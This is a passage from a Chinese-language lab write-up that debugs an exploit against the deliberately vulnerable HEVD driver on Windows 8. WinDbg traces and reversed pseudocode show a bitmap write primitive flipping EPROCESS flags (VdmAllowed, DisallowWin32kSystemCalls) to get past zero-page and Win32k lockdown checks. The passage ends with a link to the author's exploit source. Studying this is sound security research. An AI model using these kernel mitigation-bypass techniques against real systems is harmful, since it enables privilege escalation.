    nt! ?? ::NNGAKEGL::`string'+0x19d2f:
    81bb1399 e94c87edff      jmp     nt!NtAllocateVirtualMemory+0x97c (81a89aea)
我们来看一下NtAllocateVirtualMemory相关逻辑的伪代码。
    NTSTATUS __stdcall NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG ZeroBits, PULONG AllocationSize, ULONG AllocationType, ULONG Protect)
    {
          v65 = ProcessHandle;
        v68 = BaseAddress;
          v67 = AllocationSize;
        v7 = __readfsdword(292);//获取_KTHREAD结构
        v76 = v7;
        v78 = *(PVOID *)(v7 + 128); //获取+0x80 EPROCESS结构
        ……
        PreviousMode[0] = *(_BYTE *)(v7 + 346);
        ms_exc.registration.TryLevel = 0;
        v9 = v68;//传递地址值
        ……
        v12 = (unsigned int)*v9; //BaseAddress连续传递
        v74 = v12;//再次传递
        if ( v74  g
    Break instruction exception - code 80000003 (first chance)
    001b:00021d21 cc              int     3
    kd> dt nt!_EPROCESS VdmAllowed 85a44040
       +0x0c4 VdmAllowed : 0y1
可以看到VdmAllowed被改掉了，进入刚才的判断
    kd> g
    Breakpoint 1 hit
    nt!NtAllocateVirtualMemory+0x9b7://判断edx小于1000
    81a89b25 3bd0            cmp     edx,eax
    kd> r edx
    edx=00000060
    kd> p
    nt!NtAllocateVirtualMemory+0x9b9:
    81a89b27 0f8257781200    jb      nt! ?? ::NNGAKEGL::`string'+0x19d1a (81bb1384)
    kd> p//判断VdmAllowed为1，允许零页申请
    nt! ?? ::NNGAKEGL::`string'+0x19d1a:
    81bb1384 f787c400000000000001 test dword ptr [edi+0C4h],1000000h
    kd> p
    nt! ?? ::NNGAKEGL::`string'+0x19d24:
    81bb138e 0f859987edff    jne     nt!NtAllocateVirtualMemory+0x9bf (81a89b2d)
    kd> p
    nt!NtAllocateVirtualMemory+0x9bf://跳转到正常流程，而不返回C0000F0
    81a89b2d 8bc6            mov     eax,esi
可以看到，绕过了刚才的判断，接下来直接执行，可以看到，NtAllocateVirtualMemory返回了STATUS_SUCCESS（图）
**回归Win8看防护之Win32k.sys**
下面我们来看一下Win32k的API禁用的情况，当然这里默认Disallow的比特位也是为0，也就是在当前进程不禁用Win32k系统调用，在PsConvertToGuiThread函数中。
    kd> p
    nt!PsConvertToGuiThread+0x9://获得KTHREAD结构
    81b0c67f 648b3524010000  mov     esi,dword ptr fs:[124h]
    kd> r esi
    esi=8548b040
    kd> dt nt!_KTHREAD 8548b040
       +0x000 Header           : _DISPATCHER_HEADER
       +0x010 SListFaultAddress : (null)
    kd> p
    nt!PsConvertToGuiThread+0x2c://ecx获得EPROCESS结构
    81b0c6a2 8b8e80000000    mov     ecx,dword ptr [esi+80h]
    kd> p
    nt!PsConvertToGuiThread+0x32://对应Flags2的偏移
    81b0c6a8 f781c000000000000080 test dword ptr [ecx+0C0h],80000000h
    kd> dt nt!_EPROCESS Flags2 8548b040+70
       +0x0c0 Flags2 : 0x1020201
    kd> dt nt!_EPROCESS DisallowWin32kSystemCalls
       +0x0c0 DisallowWin32kSystemCalls : 0y0//判断Disallow比特位的值
这里DisallowWin32kSystemCalls的比特位为0，也就是允许win32k调用，这里到达一处条件判断，判断的就是这个比特位，如果为1，则会跳转返回C0000005，当前状态为0，允许执行时，会继续执行。
    kd> p
    nt!PsConvertToGuiThread+0x3c:
    81b0c6b2 757e            jne     nt!PsConvertToGuiThread+0xbc (81b0c732)
    kd> p
    nt!PsConvertToGuiThread+0x3e:
    81b0c6b4 8d55ff          lea     edx,[ebp-1]
接下来，我们注释掉还原的setbitmap部分，重新执行，看到Disallow比特位为1，这时候程序会进入错误处理，返回C0000022
    kd> dt nt!_EPROCESS DisallowWin32kSystemCalls 866654c0
       +0x0c0 DisallowWin32kSystemCalls : 0y1//对应比特位为1
    kd> p
    nt!PsConvertToGuiThread+0x32:
    81b0c6a8 f781c000000000000080 test dword ptr [ecx+0C0h],80000000h
    //判断Flags2.DisallowedWin32kSystemCalls
    kd> p
    nt!PsConvertToGuiThread+0x3c:
    81b0c6b2 757e            jne     nt!PsConvertToGuiThread+0xbc (81b0c732)
    kd> p
    nt!PsConvertToGuiThread+0xbc:
    81b0c732 b8220000c0      mov     eax,0C0000022h   //进入错误判断，返回C0000022
来看下这段代码逻辑。
    signed int __stdcall PsConvertToGuiThread()
    {
      v0 = __readfsdword(292);//获取_KTHREAD结构体
      if ( *(_BYTE *)(v0 + 346) )//判断_KTHREAD结构体的Previous Mode
      {
        if ( *(int **)(v0 + 60) == &KeServiceDescriptorTable )//检查是否是win32的线程
        {
          v1 = *(_DWORD *)(v0 + 128);
          if ( *(_DWORD *)(v1 + 192) & 0x80000000 )//判断DisallowedWin32kSystemCalls
          {
            result = 0xC000022;//返回C000022 STATUS_ACCESS_DENIED
          }
整个Win32k的检查过程是这样的，KiFastCallEntry -> KiEndUnexpectRange ->
PsCovertToGUIThread。这个检查过程的依据是SSDT，系统调度表，当调用不在SSDT表时，也就是第一次调用Win32k System
Call的时候，会检查win32k是否允许调用。如下代码逻辑：
    .text:00511652 loc_511652:                             ; CODE XREF: _KiEndUnexpectedRange+15j
    .text:00511652                                         ; _KiSystemService+8Aj
    .text:00511652                 mov     edi, eax ;eax = SSDTIndex
    .text:00511654                 shr     edi, 8;eax/256
    .text:00511657                 and     edi, 10h;//SSDT or SSDTShadow
    .text:0051165A                 mov     ecx, edi
    .text:0051165C          add     edi, [esi+3Ch];//检查_KTHREAD->ServiceTable
                                    //kd> dt nt!_KTHREAD ServiceTable
                                    //+0x03c ServiceTable : Ptr32 Void
    .text:0051165F                 mov     ebx, eax
    .text:00511661                 and     eax, 0FFFh
    .text:00511666                 cmp     eax, [edi+8];//检查当前系统调用号
    //和ServiceTable中的调用号，确定是不是在SSDT
    .text:00511669                 jnb     _KiEndUnexpectedRange//如果不在，则跳转
在KiEndUnexpectedRange中会通过PsConvertToGuiThread来Check状态，在这里会检查win32k系统调用的情况，如果Flags2.DisAllowedWin32kSystemCalls为1，则禁用状态，返回C000022
，也就是STATUS_ACCESS_DENIED
    .text:00511384 _KiEndUnexpectedRange proc near         ; CODE XREF: _KiSystemService+19B_x0019_j
    .text:00511384                 cmp     ecx, 10h
    .text:00511387                 jnz     short loc_5113C3
    .text:00511389                 push    edx
    .text:0051138A                 push    ebx//系统调用号
    .text:0051138B            call _PsConvertToGuiThread@0 ; PsConvertToGuiThread()
默认是不启用的，则能成功打开cmd。
我们通过setbitmap可以将其改为启用，这样PsConvertToGuiThread就会返回C000022，则后续会造成调用CreateProcess中由于禁用win32k.sys导致程序加载失败。
其实整个HEVD的这个exploit调试还是很有趣的，Bitmap也可以修改kernel
Address达到一些比较巧妙的效果，当然，如果修改的地址有问题，则会直接BSOD，我就多次发生这样的情况，快照保存了几十个。文中有一些疑问和思考不够深入的地方请师傅们多多批评指正，谢谢大家！
**超级好文：**
**文中改写源码地址：**[https://github.com/k0keoyo/try_exploit/tree/master/HEVD_Win10&Win8](https://github.com/k0keoyo/try_exploit/tree/master/HEVD_Win10&Win8)